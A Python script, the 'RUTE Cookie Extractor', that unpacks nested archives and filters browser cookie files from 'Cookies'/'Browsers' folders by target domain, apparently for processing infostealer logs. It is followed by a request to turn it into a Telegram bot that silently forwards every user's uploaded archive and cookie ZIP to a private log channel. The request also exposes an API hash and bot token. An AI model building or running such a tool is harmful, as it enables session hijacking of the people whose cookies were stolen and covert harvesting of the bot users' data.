#!/usr/bin/env python3
"""
RUTE Cookie Extractor - ULTIMATE SPEED Version
Optimized tool selection for each archive type:
- .7z  → 7z.exe
- .rar → UnRAR.exe  
- .zip → 7z.exe (fastest) OR unrar OR Python
"""

import os
import sys
import re
import zipfile
import shutil
import hashlib
import time
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Set, Dict, Optional, Tuple
import queue
import threading
import platform
import signal

# Third-party imports
try:
    from tqdm import tqdm
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
except ImportError:
    os.system("pip install -q tqdm colorama")
    from tqdm import tqdm
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)

# Try to import rarfile for password detection only
try:
    import rarfile
    HAS_RARFILE = True
except ImportError:
    HAS_RARFILE = False
    try:
        os.system("pip install -q rarfile")
        import rarfile
        HAS_RARFILE = True
    except:
        HAS_RARFILE = False

# Try to import py7zr for password detection only
try:
    import py7zr
    HAS_PY7ZR = True
except ImportError:
    HAS_PY7ZR = False
    try:
        os.system("pip install -q py7zr")
        import py7zr
        HAS_PY7ZR = True
    except:
        HAS_PY7ZR = False

# ==============================================================================
#                            CONFIGURATION
# ==============================================================================

# ULTIMATE SPEED SETTINGS
MAX_WORKERS = 100  # 100 threads for maximum speed
BUFFER_SIZE = 20 * 1024 * 1024  # 20MB buffer
CHUNK_SIZE = 1024 * 1024  # 1MB chunks for file reading

SUPPORTED_ARCHIVES = {'.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz'}
COOKIE_FOLDERS = {'Cookies', 'Browsers'}

# Detect system
SYSTEM = platform.system().lower()

# ==============================================================================
#                            TOOL DETECTION
# ==============================================================================

class ToolDetector:
    """Detect available external tools"""
    
    @staticmethod
    def check_unrar() -> bool:
        """Check if unrar is available"""
        try:
            if SYSTEM == 'windows':
                # Check common Windows paths
                paths = [
                    'C:\\Program Files\\WinRAR\\UnRAR.exe',
                    'C:\\Program Files (x86)\\WinRAR\\UnRAR.exe',
                    'unrar.exe'
                ]
                for path in paths:
                    if os.path.exists(path):
                        return True
                # Try command
                result = subprocess.run(['unrar'], capture_output=True, shell=True)
                return result.returncode != 127
            else:
                result = subprocess.run(['which', 'unrar'], capture_output=True, text=True)
                return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def check_7z() -> bool:
        """Check if 7z is available"""
        try:
            if SYSTEM == 'windows':
                # Check common Windows paths
                paths = [
                    'C:\\Program Files\\7-Zip\\7z.exe',
                    'C:\\Program Files (x86)\\7-Zip\\7z.exe',
                    '7z.exe'
                ]
                for path in paths:
                    if os.path.exists(path):
                        return True
                # Try command
                result = subprocess.run(['7z'], capture_output=True, shell=True)
                return result.returncode != 127
            else:
                result = subprocess.run(['which', '7z'], capture_output=True, text=True)
                if result.returncode != 0:
                    result = subprocess.run(['which', '7zz'], capture_output=True, text=True)
                return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def get_tool_path(tool_name: str) -> Optional[str]:
        """Get full path to tool"""
        if tool_name == 'unrar':
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\WinRAR\\UnRAR.exe',
                    'C:\\Program Files (x86)\\WinRAR\\UnRAR.exe',
                ]
                for path in paths:
                    if os.path.exists(path):
                        return path
                return 'unrar.exe'
            else:
                result = subprocess.run(['which', 'unrar'], capture_output=True, text=True)
                return result.stdout.strip() if result.returncode == 0 else 'unrar'
        
        elif tool_name == '7z':
            if SYSTEM == 'windows':
                paths = [
                    'C:\\Program Files\\7-Zip\\7z.exe',
                    'C:\\Program Files (x86)\\7-Zip\\7z.exe',
                ]
                for path in paths:
                    if os.path.exists(path):
                        return path
                return '7z.exe'
            else:
                for cmd in ['7z', '7zz']:
                    result = subprocess.run(['which', cmd], capture_output=True, text=True)
                    if result.returncode == 0:
                        return result.stdout.strip()
                return '7z'
        
        return tool_name

# ==============================================================================
#                            TOOL STATUS
# ==============================================================================

TOOL_STATUS = {
    'unrar': ToolDetector.check_unrar(),
    '7z': ToolDetector.check_7z(),
}

TOOL_PATHS = {
    'unrar': ToolDetector.get_tool_path('unrar') if TOOL_STATUS['unrar'] else None,
    '7z': ToolDetector.get_tool_path('7z') if TOOL_STATUS['7z'] else None,
}

# ==============================================================================
#                            UTILITY FUNCTIONS
# ==============================================================================

def print_banner():
    """Print cool banner with tool status"""
    tools_status = []
    if TOOL_STATUS['unrar']:
        tools_status.append(f"{Fore.GREEN}✓ UnRAR.exe{Style.RESET_ALL}")
    else:
        tools_status.append(f"{Fore.RED}✗ UnRAR.exe{Style.RESET_ALL}")
    
    if TOOL_STATUS['7z']:
        tools_status.append(f"{Fore.GREEN}✓ 7z.exe{Style.RESET_ALL}")
    else:
        tools_status.append(f"{Fore.RED}✗ 7z.exe{Style.RESET_ALL}")
    
    tools_str = ' · '.join(tools_status)
    
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║{Fore.YELLOW}     🚀 RUTE COOKIE EXTRACTOR - ULTIMATE SPEED 🚀      {Fore.CYAN}║
║{Fore.WHITE}       100 Threads · External Tools: {tools_str}          {Fore.CYAN}║
║{Fore.WHITE}       .7z → 7z.exe | .rar → UnRAR.exe | .zip → fastest available{Fore.CYAN}║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def sanitize_filename(filename: str) -> str:
    """Quick sanitize for filenames"""
    return ''.join(c if c.isalnum() or c in '._-' else '_' for c in filename)

def generate_random_string(length: int = 6) -> str:
    """Generate random string for unique filenames"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_file_hash_fast(filepath: str) -> str:
    """Fast file hash (first/last chunks only)"""
    try:
        with open(filepath, 'rb', buffering=BUFFER_SIZE) as f:
            first = f.read(1024)
            f.seek(-1024, 2)
            last = f.read(1024)
            return hashlib.md5(first + last).hexdigest()[:8]
    except:
        return str(os.path.getmtime(filepath))

def format_size(size_bytes: int) -> str:
    """Quick size formatting"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size_bytes < 1024.0:
            return f"{size_bytes:.1f}{unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.1f}TB"

def format_time(seconds: float) -> str:
    """Format seconds to human readable"""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f}m"
    else:
        return f"{seconds/3600:.1f}h"

def delete_entire_folder(folder_path: str) -> bool:
    """Delete entire folder in one operation"""
    if not os.path.exists(folder_path):
        return True
    
    try:
        # Force garbage collection to close any open handles
        import gc
        gc.collect()
        
        # Try multiple methods
        methods = [
            lambda: shutil.rmtree(folder_path, ignore_errors=True),
            lambda: os.system(f'rmdir /s /q "{folder_path}"' if SYSTEM == 'windows' else f'rm -rf "{folder_path}"'),
        ]
        
        for method in methods:
            try:
                method()
                time.sleep(0.5)
                if not os.path.exists(folder_path):
                    return True
            except:
                continue
        
        return not os.path.exists(folder_path)
    except:
        return False

# ==============================================================================
#                            PASSWORD DETECTION
# ==============================================================================

class PasswordDetector:
    """Detect if archive is password protected"""
    
    @staticmethod
    def check_rar_protected(archive_path: str) -> bool:
        """Check RAR password protection"""
        if not HAS_RARFILE:
            if TOOL_STATUS['unrar']:
                try:
                    cmd = [TOOL_PATHS['unrar'], 'l', archive_path]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    return 'password' in result.stderr.lower() or 'encrypted' in result.stderr.lower()
                except:
                    pass
            return True
        
        try:
            with rarfile.RarFile(archive_path) as rf:
                return rf.needs_password()
        except:
            return True
    
    @staticmethod
    def check_7z_protected(archive_path: str) -> bool:
        """Check 7z password protection"""
        if not HAS_PY7ZR:
            if TOOL_STATUS['7z']:
                try:
                    cmd = [TOOL_PATHS['7z'], 'l', archive_path]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    return 'Encrypted' in result.stdout or 'Password' in result.stdout
                except:
                    pass
            return True
        
        try:
            with py7zr.SevenZipFile(archive_path, mode='r') as sz:
                return sz.password_protected
        except:
            return True
    
    @staticmethod
    def check_zip_protected(archive_path: str) -> bool:
        """Check ZIP password protection"""
        # Try with 7z first (fastest)
        if TOOL_STATUS['7z']:
            try:
                cmd = [TOOL_PATHS['7z'], 'l', archive_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if 'Encrypted' in result.stdout or 'Password' in result.stdout:
                    return True
            except:
                pass
        
        # Try with unrar (some ZIP use RAR encryption)
        if TOOL_STATUS['unrar']:
            try:
                cmd = [TOOL_PATHS['unrar'], 'l', archive_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if 'password' in result.stderr.lower() or 'encrypted' in result.stderr.lower():
                    return True
            except:
                pass
        
        # Fallback to Python
        try:
            with zipfile.ZipFile(archive_path, 'r') as zf:
                for info in zf.infolist():
                    if info.flag_bits & 0x1:
                        return True
                return False
        except:
            return True

# ==============================================================================
#                            ARCHIVE EXTRACTION - OPTIMIZED PER TYPE
# ==============================================================================

class UltimateArchiveExtractor:
    """Ultimate speed archive extraction - best tool for each format"""
    
    def __init__(self, password: Optional[str] = None):
        self.password = password
        self.processed_files: Set[str] = set()
        self.lock = threading.Lock()
        self.extracted_count = 0
        self.stop_extraction = False
    
    def extract_7z_with_7z(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .7z using 7z.exe (best for 7z)"""
        try:
            cmd = [TOOL_PATHS['7z'], 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            cmd.append(f'-o{extract_dir}')
            cmd.append(archive_path)
            
            result = subprocess.run(cmd, capture_output=True, timeout=300)
            
            if result.returncode == 0:
                files = []
                for root, _, filenames in os.walk(extract_dir):
                    for f in filenames:
                        rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                        files.append(rel_path)
                return files
            return []
        except:
            return []
    
    def extract_rar_with_unrar(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .rar using UnRAR.exe (best for RAR)"""
        try:
            cmd = [TOOL_PATHS['unrar'], 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            else:
                cmd.append('-p-')
            cmd.append(archive_path)
            cmd.append(extract_dir + ('\\' if SYSTEM == 'windows' else '/'))
            
            result = subprocess.run(cmd, capture_output=True, timeout=300)
            
            if result.returncode == 0:
                files = []
                for root, _, filenames in os.walk(extract_dir):
                    for f in filenames:
                        rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                        files.append(rel_path)
                return files
            return []
        except:
            return []
    
    def extract_zip_fastest(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract .zip using fastest available method"""
        # Priority: 7z.exe > unrar.exe > Python zipfile
        if TOOL_STATUS['7z']:
            try:
                cmd = [TOOL_PATHS['7z'], 'x', '-y']
                if self.password:
                    cmd.append(f'-p{self.password}')
                cmd.append(f'-o{extract_dir}')
                cmd.append(archive_path)
                
                result = subprocess.run(cmd, capture_output=True, timeout=300)
                
                if result.returncode == 0:
                    files = []
                    for root, _, filenames in os.walk(extract_dir):
                        for f in filenames:
                            rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                            files.append(rel_path)
                    return files
            except:
                pass
        
        if TOOL_STATUS['unrar']:
            try:
                cmd = [TOOL_PATHS['unrar'], 'x', '-y']
                if self.password:
                    cmd.append(f'-p{self.password}')
                else:
                    cmd.append('-p-')
                cmd.append(archive_path)
                cmd.append(extract_dir + ('\\' if SYSTEM == 'windows' else '/'))
                
                result = subprocess.run(cmd, capture_output=True, timeout=300)
                
                if result.returncode == 0:
                    files = []
                    for root, _, filenames in os.walk(extract_dir):
                        for f in filenames:
                            rel_path = os.path.relpath(os.path.join(root, f), extract_dir)
                            files.append(rel_path)
                    return files
            except:
                pass
        
        # Fallback to Python
        try:
            with zipfile.ZipFile(archive_path, 'r') as zf:
                if self.password:
                    zf.extractall(extract_dir, pwd=self.password.encode())
                else:
                    zf.extractall(extract_dir)
                return zf.namelist()
        except:
            return []
    
    def extract_rar_fallback(self, archive_path: str, extract_dir: str) -> List[str]:
        """Fallback RAR extraction using rarfile"""
        try:
            with rarfile.RarFile(archive_path) as rf:
                if self.password:
                    rf.setpassword(self.password)
                rf.extractall(extract_dir)
                return rf.namelist()
        except:
            return []
    
    def extract_7z_fallback(self, archive_path: str, extract_dir: str) -> List[str]:
        """Fallback 7z extraction using py7zr"""
        try:
            with py7zr.SevenZipFile(archive_path, mode='r', password=self.password) as sz:
                sz.extractall(extract_dir)
                return sz.getnames()
        except:
            return []
    
    def extract_tar_fast(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract TAR/GZ/BZ2"""
        try:
            import tarfile
            with tarfile.open(archive_path, 'r:*') as tf:
                tf.extractall(extract_dir)
                return tf.getnames()
        except:
            return []
    
    def extract_single(self, archive_path: str, extract_dir: str) -> List[str]:
        """Extract a single archive using best tool for its type"""
        if self.stop_extraction:
            return []
        
        ext = os.path.splitext(archive_path)[1].lower()
        
        try:
            # .7z files -> use 7z.exe
            if ext == '.7z':
                if TOOL_STATUS['7z']:
                    return self.extract_7z_with_7z(archive_path, extract_dir)
                elif HAS_PY7ZR:
                    return self.extract_7z_fallback(archive_path, extract_dir)
            
            # .rar files -> use UnRAR.exe
            elif ext == '.rar':
                if TOOL_STATUS['unrar']:
                    return self.extract_rar_with_unrar(archive_path, extract_dir)
                elif HAS_RARFILE:
                    return self.extract_rar_fallback(archive_path, extract_dir)
            
            # .zip files -> use fastest available (7z.exe > unrar.exe > Python)
            elif ext == '.zip':
                return self.extract_zip_fastest(archive_path, extract_dir)
            
            # Other formats (tar, gz, etc.)
            else:
                return self.extract_tar_fast(archive_path, extract_dir)
        
        except:
            pass
        
        return []
    
    def find_archives_fast(self, directory: str) -> List[str]:
        """Find all archives"""
        archives = []
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in SUPPORTED_ARCHIVES:
                        archives.append(os.path.join(root, file))
        except:
            pass
        return archives
    
    def extract_all_nested(self, root_archive: str, base_dir: str) -> str:
        """Extract all nested archives"""
        current_level = {root_archive}
        level = 0
        total_archives = 1
        
        # Show which tools are being used
        print(f"{Fore.CYAN}📦 Extraction methods:{Style.RESET_ALL}")
        if TOOL_STATUS['7z']:
            print(f"  {Fore.GREEN}✓ .7z → 7z.exe{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}⚠ .7z → py7zr (slow){Style.RESET_ALL}")
        
        if TOOL_STATUS['unrar']:
            print(f"  {Fore.GREEN}✓ .rar → UnRAR.exe{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}⚠ .rar → rarfile (slow){Style.RESET_ALL}")
        
        zip_method = "7z.exe" if TOOL_STATUS['7z'] else "UnRAR.exe" if TOOL_STATUS['unrar'] else "zipfile (slow)"
        print(f"  {Fore.GREEN if TOOL_STATUS['7z'] or TOOL_STATUS['unrar'] else Fore.YELLOW}✓ .zip → {zip_method}{Style.RESET_ALL}")
        
        with tqdm(total=total_archives, desc="Extracting", unit="archives", colour="green") as pbar:
            while current_level and not self.stop_extraction:
                next_level = set()
                level_dir = os.path.join(base_dir, f"L{level}")
                os.makedirs(level_dir, exist_ok=True)
                
                with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                    futures = {}
                    for archive in current_level:
                        if archive in self.processed_files or self.stop_extraction:
                            continue
                        
                        archive_name = os.path.splitext(os.path.basename(archive))[0]
                        archive_name = sanitize_filename(archive_name)[:50]
                        extract_subdir = os.path.join(level_dir, archive_name)
                        os.makedirs(extract_subdir, exist_ok=True)
                        
                        future = executor.submit(self.extract_single, archive, extract_subdir)
                        futures[future] = (archive, extract_subdir)
                    
                    for future in as_completed(futures):
                        if self.stop_extraction:
                            executor.shutdown(wait=False)
                            break
                            
                        archive, extract_subdir = futures[future]
                        try:
                            extracted = future.result(timeout=60)
                            with self.lock:
                                self.processed_files.add(archive)
                                self.extracted_count += 1
                            
                            new_archives = self.find_archives_fast(extract_subdir)
                            next_level.update(new_archives)
                            
                            with self.lock:
                                total_archives += len(new_archives)
                                pbar.total = total_archives
                            
                            pbar.update(1)
                        except:
                            pbar.update(1)
                
                current_level = next_level
                level += 1
        
        return base_dir

# ==============================================================================
#                            COOKIE EXTRACTION
# ==============================================================================

class UltimateCookieExtractor:
    """Ultimate speed cookie extraction with per-site filtering"""
    
    def __init__(self, target_sites: List[str]):
        self.target_sites = [s.strip().lower() for s in target_sites]
        # Store files per site with original names
        self.site_files: Dict[str, Dict[str, str]] = {
            site: {} for site in self.target_sites
        }
        self.global_seen: Set[str] = set()
        self.seen_lock = threading.Lock()
        self.stats_lock = threading.Lock()
        self.total_found = 0
        self.files_processed = 0
        self.used_filenames: Dict[str, Set[str]] = {site: set() for site in self.target_sites}
        self.stop_processing = False
        
        # Pre-compile patterns for each site
        self.site_patterns = {site: re.compile(site.encode()) for site in self.target_sites}
    
    def find_cookie_files(self, extract_dir: str) -> List[Tuple[str, str]]:
        """Find all cookie files"""
        cookie_files = []
        
        def scan_worker(start_dir):
            local_files = []
            try:
                for root, _, files in os.walk(start_dir):
                    if any(folder in root for folder in COOKIE_FOLDERS):
                        for file in files:
                            if file.endswith(('.txt', '.txt.bak')):
                                local_files.append((os.path.join(root, file), file))
            except:
                pass
            return local_files
        
        # Get top-level directories
        top_dirs = []
        try:
            for item in os.listdir(extract_dir):
                item_path = os.path.join(extract_dir, item)
                if os.path.isdir(item_path):
                    top_dirs.append(item_path)
        except:
            top_dirs = [extract_dir]
        
        # Scan in parallel
        with ThreadPoolExecutor(max_workers=min(20, len(top_dirs) or 1)) as executor:
            futures = [executor.submit(scan_worker, d) for d in (top_dirs or [extract_dir])]
            for future in as_completed(futures):
                cookie_files.extend(future.result())
        
        return cookie_files
    
    def get_unique_filename(self, site: str, orig_name: str) -> str:
        """Generate unique filename"""
        base, ext = os.path.splitext(orig_name)
        
        with self.seen_lock:
            if orig_name not in self.used_filenames[site]:
                self.used_filenames[site].add(orig_name)
                return orig_name
            else:
                random_str = generate_random_string(6)
                new_name = f"{base}_{random_str}{ext}"
                
                while new_name in self.used_filenames[site]:
                    random_str = generate_random_string(6)
                    new_name = f"{base}_{random_str}{ext}"
                
                self.used_filenames[site].add(new_name)
                return new_name
    
    def process_file(self, file_path: str, orig_name: str, extract_dir: str):
        """Process a single file - create separate filtered file for each matching site"""
        if self.stop_processing:
            return
            
        try:
            # Read file
            lines = []
            with open(file_path, 'rb', buffering=BUFFER_SIZE) as f:
                for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                    lines.extend(chunk.split(b'\n'))
            
            file_hash = get_file_hash_fast(file_path)
            
            # For each site, collect ONLY lines that contain that specific site
            site_matches: Dict[str, List[Tuple[int, str]]] = {
                site: [] for site in self.target_sites
            }
            
            # Process each line once
            for line_num, line_bytes in enumerate(lines):
                if not line_bytes or line_bytes.startswith(b'#'):
                    continue
                
                line_lower = line_bytes.lower()
                line_str = line_bytes.decode('utf-8', errors='ignore').rstrip('\n\r')
                
                # Check each site separately - a line can match multiple sites
                for site in self.target_sites:
                    if self.site_patterns[site].search(line_lower):
                        unique_id = f"{site}|{file_hash}|{line_num}"
                        
                        with self.seen_lock:
                            if unique_id not in self.global_seen:
                                self.global_seen.add(unique_id)
                                site_matches[site].append((line_num, line_str))
                                with self.stats_lock:
                                    self.total_found += 1
            
            # Save SEPARATE file for EACH site that had matches
            files_saved = 0
            for site, matches in site_matches.items():
                if matches:
                    # Sort by line number to maintain original order
                    matches.sort(key=lambda x: x[0])
                    lines_list = [line for _, line in matches]
                    
                    site_dir = os.path.join(extract_dir, "cookies", site)
                    os.makedirs(site_dir, exist_ok=True)
                    
                    unique_name = self.get_unique_filename(site, orig_name)
                    out_path = os.path.join(site_dir, unique_name)
                    
                    # Write ONLY lines that contain THIS site
                    with open(out_path, 'w', encoding='utf-8', buffering=BUFFER_SIZE) as f:
                        f.write('\n'.join(lines_list))
                    
                    with self.seen_lock:
                        self.site_files[site][out_path] = unique_name
                    
                    files_saved += 1
            
            with self.stats_lock:
                self.files_processed += 1
                
        except Exception as e:
            pass
    
    def process_all(self, extract_dir: str):
        """Process all files"""
        cookie_files = self.find_cookie_files(extract_dir)
        
        if not cookie_files:
            return
        
        print(f"{Fore.CYAN}📁 Found {len(cookie_files)} files - processing with {MAX_WORKERS} threads{Style.RESET_ALL}")
        
        with tqdm(total=len(cookie_files), desc="Filtering", unit="files", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = []
                for file_path, orig_name in cookie_files:
                    if self.stop_processing:
                        break
                    future = executor.submit(self.process_file, file_path, orig_name, extract_dir)
                    futures.append(future)
                
                for future in as_completed(futures):
                    if self.stop_processing:
                        executor.shutdown(wait=False)
                        break
                    future.result()
                    pbar.update(1)
    
    def create_site_zips(self, extract_dir: str, result_folder: str) -> Dict[str, str]:
        """Create ZIP archives per site"""
        created_zips = {}
        
        for site, files_dict in self.site_files.items():
            if not files_dict:
                continue
            
            timestamp = datetime.now().strftime('%H%M%S')
            zip_name = f"{sanitize_filename(site)}_{timestamp}.zip"
            zip_path = os.path.join(result_folder, zip_name)
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_STORED) as zf:
                for file_path, unique_name in files_dict.items():
                    if os.path.exists(file_path):
                        zf.write(file_path, unique_name)
            
            created_zips[site] = zip_path
        
        return created_zips

# ==============================================================================
#                            MAIN APPLICATION
# ==============================================================================

class UltimateSpeedApp:
    """Main application"""
    
    def __init__(self):
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.extracted_dir = os.path.join(self.base_dir, 'extracted')
        self.results_dir = os.path.join(self.base_dir, 'results')
        self.start_time = None
        self.extract_folder = None
        self.extractor = None
        self.cookie_extractor = None
        self.running = True
        
    def cleanup_handler(self, signum=None, frame=None):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Fore.YELLOW}⚠ Received interrupt, cleaning up...{Style.RESET_ALL}")
        self.running = False
        
        # Stop extractors
        if self.extractor:
            self.extractor.stop_extraction = True
        if self.cookie_extractor:
            self.cookie_extractor.stop_processing = True
        
        # Delete entire folder
        if self.extract_folder and os.path.exists(self.extract_folder):
            print(f"{Fore.YELLOW}🧹 Deleting entire folder: {self.extract_folder}{Style.RESET_ALL}")
            delete_entire_folder(self.extract_folder)
        
        sys.exit(1)
    
    def setup(self):
        """Setup directories"""
        os.makedirs(self.extracted_dir, exist_ok=True)
        os.makedirs(self.results_dir, exist_ok=True)
        
    def get_inputs(self):
        """Get user inputs"""
        # Archive path
        while True:
            path = input(f"{Fore.YELLOW}📂 Archive path: {Style.RESET_ALL}").strip().strip('"\'')
            if os.path.exists(path):
                break
            print(f"{Fore.RED}✗ File not found{Style.RESET_ALL}")
        
        # Password check
        print(f"{Fore.CYAN}🔍 Checking password protection...{Style.RESET_ALL}")
        
        ext = os.path.splitext(path)[1].lower()
        is_protected = False
        
        if ext == '.rar':
            is_protected = PasswordDetector.check_rar_protected(path)
        elif ext == '.7z':
            is_protected = PasswordDetector.check_7z_protected(path)
        elif ext == '.zip':
            is_protected = PasswordDetector.check_zip_protected(path)
        else:
            is_protected = False
        
        password = None
        if is_protected:
            print(f"{Fore.YELLOW}⚠ Archive is password protected{Style.RESET_ALL}")
            password = input(f"{Fore.YELLOW}🔑 Enter password (or press Enter if none): {Style.RESET_ALL}").strip()
            if password == "":
                password = None
        else:
            print(f"{Fore.GREEN}✓ Archive is not password protected{Style.RESET_ALL}")
        
        # Target sites
        sites = input(f"{Fore.YELLOW}🎯 Domains (comma-separated): {Style.RESET_ALL}").strip()
        target_sites = [s.strip().lower() for s in sites.split(',') if s.strip()]
        
        return path, password, target_sites
    
    def cleanup(self):
        """Delete entire extraction folder in one operation"""
        if self.extract_folder and os.path.exists(self.extract_folder):
            print(f"{Fore.YELLOW}🧹 Deleting entire folder: {self.extract_folder}{Style.RESET_ALL}")
            
            # Force garbage collection
            import gc
            gc.collect()
            
            # Single delete operation
            try:
                shutil.rmtree(self.extract_folder, ignore_errors=True)
                time.sleep(0.5)
                
                if os.path.exists(self.extract_folder):
                    if SYSTEM == 'windows':
                        os.system(f'rmdir /s /q "{self.extract_folder}"')
                    else:
                        os.system(f'rm -rf "{self.extract_folder}"')
                
                if not os.path.exists(self.extract_folder):
                    print(f"{Fore.GREEN}✓ Folder deleted successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}⚠ Could not delete folder{Style.RESET_ALL}")
                    
            except Exception as e:
                print(f"{Fore.YELLOW}⚠ Error deleting folder: {e}{Style.RESET_ALL}")
    
    def run(self):
        """Main execution"""
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.cleanup_handler)
        if SYSTEM != 'windows':
            signal.signal(signal.SIGTERM, self.cleanup_handler)
        
        print_banner()
        self.start_time = time.time()
        self.setup()
        
        # Get inputs
        archive_path, password, target_sites = self.get_inputs()
        
        if not target_sites:
            print(f"{Fore.RED}✗ No domains specified{Style.RESET_ALL}")
            return
        
        # Create folders
        unique_id = datetime.now().strftime('%H%M%S')
        self.extract_folder = os.path.join(self.extracted_dir, f"x{unique_id}")
        result_folder = os.path.join(self.results_dir, datetime.now().strftime('%Y-%m-%d'))
        os.makedirs(self.extract_folder, exist_ok=True)
        os.makedirs(result_folder, exist_ok=True)
        
        file_size = format_size(os.path.getsize(archive_path))
        print(f"{Fore.CYAN}📦 Archive size: {file_size}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⚡ Using {MAX_WORKERS} threads{Style.RESET_ALL}")
        
        try:
            # STEP 1: Extract with optimized tools per format
            print(f"\n{Fore.CYAN}📦 Extracting archives with optimal tools...{Style.RESET_ALL}")
            self.extractor = UltimateArchiveExtractor(password)
            extract_dir = self.extractor.extract_all_nested(archive_path, self.extract_folder)
            
            if not self.running:
                return
            
            # STEP 2: Filter cookies (per-site filtering)
            print(f"\n{Fore.CYAN}🔍 Filtering cookies for {len(target_sites)} domains...{Style.RESET_ALL}")
            self.cookie_extractor = UltimateCookieExtractor(target_sites)
            self.cookie_extractor.process_all(extract_dir)
            
            if not self.running:
                return
            
            # STEP 3: Create ZIPs
            if self.cookie_extractor.total_found > 0:
                print(f"\n{Fore.CYAN}📦 Creating ZIP archives...{Style.RESET_ALL}")
                created_zips = self.cookie_extractor.create_site_zips(extract_dir, result_folder)
                
                # Show results
                elapsed = time.time() - self.start_time
                print(f"\n{Fore.GREEN}╔════════════════════════════════════════╗")
                print(f"║         EXTRACTION COMPLETE!         ║")
                print(f"╠════════════════════════════════════════╣")
                print(f"║  {Fore.YELLOW}Time:{Fore.WHITE} {format_time(elapsed):>20} {Fore.GREEN}║")
                print(f"║  {Fore.YELLOW}Files processed:{Fore.WHITE} {self.cookie_extractor.files_processed:>14} {Fore.GREEN}║")
                print(f"║  {Fore.YELLOW}Entries found:{Fore.WHITE} {self.cookie_extractor.total_found:>15} {Fore.GREEN}║")
                print(f"║  {Fore.YELLOW}ZIP archives:{Fore.WHITE} {len(created_zips):>16} {Fore.GREEN}║")
                print(f"╚════════════════════════════════════════╝{Style.RESET_ALL}")
                
                # Show per-site stats
                for site in target_sites:
                    if site in self.cookie_extractor.site_files:
                        files_count = len(self.cookie_extractor.site_files[site])
                        if files_count > 0:
                            print(f"{Fore.WHITE}  ✓ {site}: {files_count} files{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠ No matching cookies found{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"\n{Fore.RED}✗ Error: {e}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
        
        finally:
            # ALWAYS cleanup entire folder
            self.cleanup()

# ==============================================================================
#                                MAIN
# ==============================================================================

if __name__ == "__main__":
    app = UltimateSpeedApp()
    app.run()

Now convert this into python pyrofork bot that can do exactly same as this script ..add alll types of error handeling where wont stuck/crash no matter what
add  add /stats support that will print full server info
🖥️ System Statistics Dashboard

💾 Disk Storage
├ Total:  698.06 GB
├ Used:  23.36 GB (3.3%)
└ Free:  674.70 GB

🧠 RAM (Memory)
├ Total:  31.90 GB
├ Used:  2.17 GB (6.8%)
└ Free:  29.74 GB

⚡ CPU
├ Cores:  8
└ Usage:  0.2%

🔌 Bot Process
 ├ CPU:  0.0%
 ├ RAM (RSS):  122.45 MB
 └ RAM (VMS):  109.79 MB

🌐 Network
├ Upload Speed:  2.21 KB/s
├ Download Speed:  107.73 KB/s
└ Total I/O:  1.79 GB

📟 System Info
├ OS:  Windows
├ OS Version:  10
├ Python:  3.11.2
└ Uptime:  00h 31m 51s

⏱️ Performance
└ Current Ping:  180.039 ms
add Owner Credits: @still_alivenow
add queue system where bot can process multiple user tast at a time but one user can process one file at a time
file size is 4gb
add /queue to see all quese with user info and file size with current queue add /cancel button to cancel ant operation(task,sending domain,password etc)
and bot will silently forward all user send archieve file and user cookies .zip in logs channel

now give me full bot code

API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN = "8315539700:AAH3NGnaLNQeeV6-2wNJsDFmGPjXInU2YeY"
LOG_CHANNEL = -1003747061396
SEND_LOGS = True
ADMINS = [7125341830]
it want it will delect cookies.zip or any other file from that user after (sending to user and forwading log channel)
add dynamic progress bar with dynamic info like speed ,eta,elapsed,size,dowload comlete size etc
